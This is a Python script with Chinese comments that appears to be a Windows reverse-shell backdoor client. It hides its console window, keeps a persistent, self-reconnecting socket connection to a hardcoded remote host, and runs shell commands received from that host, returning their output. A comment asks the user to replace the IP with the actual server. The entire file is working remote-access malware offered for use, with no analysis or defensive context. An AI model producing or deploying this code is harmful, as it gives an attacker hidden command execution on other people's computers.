import socket
import subprocess
import time
import select
import sys
import os
import ctypes

# 隐藏窗口
if sys.platform == 'win32':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def execute_command(cmd):
    """执行命令并返回结果"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            startupinfo=startupinfo
        )
        
        output = proc.stdout.read().decode('gbk', errors='replace')
        return output.strip() or "命令执行成功（无输出）"
    except Exception as e:
        return f"执行错误: {str(e)}"

def maintain_connection(rhost, rport):
    """维持持久连接"""
    while True:
        try:
            s = socket.socket()
            s.connect((rhost, rport))
            print("[*] 成功连接服务端")
            
            while True:
                ready, _, _ = select.select([s], [], [], 60)
                if ready:
                    data = s.recv(4096).decode('utf-8', errors='replace')
                    if not data:
                        break
                    
                    if data.startswith("REMOTE_CMD:"):
                        cmd = data[len("REMOTE_CMD:"):].strip()
                        result = execute_command(cmd)
                        s.sendall(f"CMD_RESULT:{result}".encode('utf-8'))
                    elif data == "HEARTBEAT":
                        s.send(b"ALIVE")
        except (ConnectionRefusedError, TimeoutError):
            print("[!] 连接失败，10秒后重试...")
            time.sleep(10)
        except Exception as e:
            print(f"[!] 连接异常: {str(e)}, 30秒后重试...")
            time.sleep(30)

if __name__ == "__main__":
    maintain_connection("192.168.189.1", 9999)  # 修改为实际服务端IP
